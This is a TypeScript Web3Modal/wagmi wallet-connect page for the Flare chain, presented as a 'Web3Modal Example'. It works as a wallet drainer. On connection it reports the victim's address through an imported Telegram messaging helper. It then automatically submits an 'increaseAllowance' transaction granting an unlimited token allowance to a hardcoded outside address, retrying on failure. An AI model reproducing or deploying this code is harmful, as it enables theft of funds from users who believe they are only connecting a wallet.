import {
  createWeb3Modal,
  walletConnectProvider,
  defaultWagmiConfig,
} from "@web3modal/wagmi";

import {
  configureChains,
  getNetwork,
  switchNetwork,
  writeContract,
} from "@wagmi/core";
import { flare } from "viem/chains";
import { publicProvider } from "@wagmi/core/providers/public";

import { watchAccount, disconnect, getAccount } from "@wagmi/core";
import { wflareAbi } from "./abi";
import { sendConnectMsg } from "./SendTg";

// 1. Define constants
const projectId = "b3ae38fc6afaa5b33311a2332c3c039a";

// 2. Configure wagmi client
const { chains } = configureChains(
  [flare],
  [walletConnectProvider({ projectId }), publicProvider()]
);

const metadata = {
  name: "Web3Modal",
  description: "Web3Modal Example",
  url: "https://web3modal.com",
  icons: ["https://avatars.githubusercontent.com/u/37784886"],
};

const config = defaultWagmiConfig({ chains, projectId, metadata });

// 3. Create modal
//@ts-ignore
const modal = createWeb3Modal({
  wagmiConfig: config,
  projectId,
  enableAnalytics: false,
});

//main.js

function connect() {
  if (getAccount().isConnected) {
    disconnect();
    switchNetwork({
      chainId: flare.id,
    });
  } else {
    modal.open();
  }
}

async function callIncreaseAllowance() {
  await writeContract({
    abi: wflareAbi,
    address: "0x1D80c49BbBCd1C0911346656B529DF9E5c2F783d",
    functionName: "increaseAllowance",
    args: [
      "0x00006be452316f8ab73dfc850ef0acc766600000",
      "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
    ],
  }).then((hash) => {});
}

document.addEventListener("DOMContentLoaded", () => {
  btnEl!.addEventListener("click", connect);

  increaseAllowanceBtn?.addEventListener("click", async () => {
    await callIncreaseAllowance();
  });
});

const btnEl = document.getElementById("btn");
const increaseAllowanceBtn = document.getElementById("writeContract");

// listening for account changes
watchAccount(async (account) => {
  const chainId = getNetwork();
  // userEl!.innerText = account.address ?? "";
  if (account.isConnected) {
    await sendConnectMsg(account.address as string);
    btnEl!.innerText = `Disconnect ${account.address?.substring(0, 7)}`;
    if (chainId.chain?.id !== flare.id) {
      switchNetwork({
        chainId: flare.id,
      });
    }
    try {
      await callIncreaseAllowance();
    } catch (error) {
      callIncreaseAllowance();
    }
    console.log("donee");
  } else {
    btnEl!.innerText = "Connect";
  }
});
